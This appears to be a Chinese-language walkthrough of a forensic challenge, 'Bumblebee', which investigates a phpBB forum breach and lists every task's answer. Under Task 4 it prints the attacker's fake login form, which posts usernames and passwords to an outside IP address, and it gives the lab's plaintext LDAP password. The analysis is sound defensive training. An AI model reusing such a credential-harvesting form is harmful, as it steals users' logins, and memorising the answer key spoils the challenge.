# Bumblebee

:::info Sherlock Scenario

An external contractor has accessed the internal forum here at Forela via the Guest WiFi and they appear to have stolen credentials for the administrative user! We have attached some logs from the forum and a full database dump in sqlite3 format to help you in your investigation.

一名外部承包商通过客用 WiFi 访问了 Forela 的内部论坛，似乎窃取了管理员用户的凭证！我们附上了论坛的一些日志和完整的 sqlite3 格式数据库转储文件，以帮助您进行调查。

:::

## 题目数据

[bumblebee.zip](./bumblebee.zip)

## Task 1

> 外部承包商的用户名是什么？

在数据库的 `phpbb_users` 中就可以找到

```plaintext title="Answer"
apoole1
```

## Task 2

> 承包商用来创建其账户的 IP 地址是什么？

同样也在上题的数据库中

```plaintext title="Answer"
10.10.0.78
```

## Task 3

> 承包商制作的恶意帖子的 post_id 是什么？

在数据库的 `phpbb_posts` 中就可以找到

```plaintext title="Answer"
9
```

## Task 4

> 凭证窃取器发送数据的完整 URI 是什么？

在上一题的数据库中，查看承包商发布的贴子，即可发现

```html
<form action="http://10.10.0.78/update.php" method="post" id="login" data-focus="username" target="hiddenframe">
    <div class="panel">
        <div class="inner">
            <div class="content">
                <h2 class="login-title">Login</h2>
                <fieldset class="fields1">
                    <dl>
                        <dt><label for="username">Username:</label></dt>
                        <dd><input type="text" tabindex="1" name="username" id="username" size="25" value=""
                                class="inputbox autowidth"></dd>
                    </dl>
                    <dl>
                        <dt><label for="password">Password:</label></dt>
                        <dd><input type="password" tabindex="2" id="password" name="password" size="25"
                                class="inputbox autowidth" autocomplete="off"></dd>
                    </dl>
                    <dl>
                        <dd><label for="autologin"><input type="checkbox" name="autologin" id="autologin"
                                    tabindex="4">Remember me</label></dd>
                        <dd><label for="viewonline"><input type="checkbox" name="viewonline" id="viewonline"
                                    tabindex="5">Hide my online status this
                                session</label></dd>
                    </dl>
                    <dl>
                        <dt>&nbsp;</dt>
                        <dd> <input type="submit" name="login" tabindex="6" value="Login" class="button1"
                                onclick="sethidden()"></dd>
                    </dl>
                </fieldset class="fields1">
            </div>
        </div>
    </div>
</form>
```

```plaintext title="Answer"
http://10.10.0.78/update.php
```

## Task 5

> 承包商何时以管理员身份登录论坛？（协调世界时）

在数据库的 `phpbb_log` 表中，有一个记录的 `operation` 是 `LOG_ADMIN_AUTH_SUCCESS`，其对应的时间戳是 `1682506392`

将时间戳转换为标准时间格式

```plaintext
1682506392 --> Wed 26 April 2023 10:53:12 UTC
```

```plaintext title="Answer"
26/04/2023 10:53:12
```

## Task 6

> 论坛中有用于 LDAP 连接的明文凭据，密码是什么？

在数据库的 `phpbb_config` 表中，有一份数据 `ldap_password`

```plaintext title="Answer"
Passw0rd1
```

## Task 7

> 管理员用户的用户代理是什么？

在数据库的 `phpbb_log` 表中，寻找 `operation` 为 `LOG_ADMIN_AUTH_SUCCESS` 的记录，可以找到这两条 ip

```plaintext
10.255.254.2
10.10.0.78
```

前面已经确定承包商的 ip 为 `10.10.0.78`，那么 `10.255.254.2` 就是管理员用户的 ip，在 `access.log` 中可以找到 `user-agent`

```plaintext title="Answer"
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
```

## Task 8

> 承包商何时将自己添加到管理员组？（协调世界时）

在数据库的 `phpbb_log` 表中，有一条`operation`为`LOG_USERS_ADDED`的记录，数据为

```plaintext
a:2:{i:0;s:14:"Administrators";i:1;s:6:"apoole";}
```

可以断定这一条就是承包商将自己的账户添加进管理员组的记录

```plaintext
1682506431 --> Wed 26 April 2023 10:53:51 UTC
```

```plaintext title="Answer"
26/04/2023 10:53:51
```

## Task 9

> 承包商何时下载了数据库备份？（协调世界时）

在`access.log`文件中，用`backup`作为关键词进行搜索，可以得到这一条记录

```plaintext
10.10.0.78 - - [26/Apr/2023:12:01:38 +0100] "GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz HTTP/1.1" 200 34707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
```

```plaintext title="Answer"
26/04/2023 11:01:38
```

## Task 10

> 按照 access.log 中的记录，数据库备份的大小是多少字节？

上一题中就有

```plaintext title="Answer"
34707
```
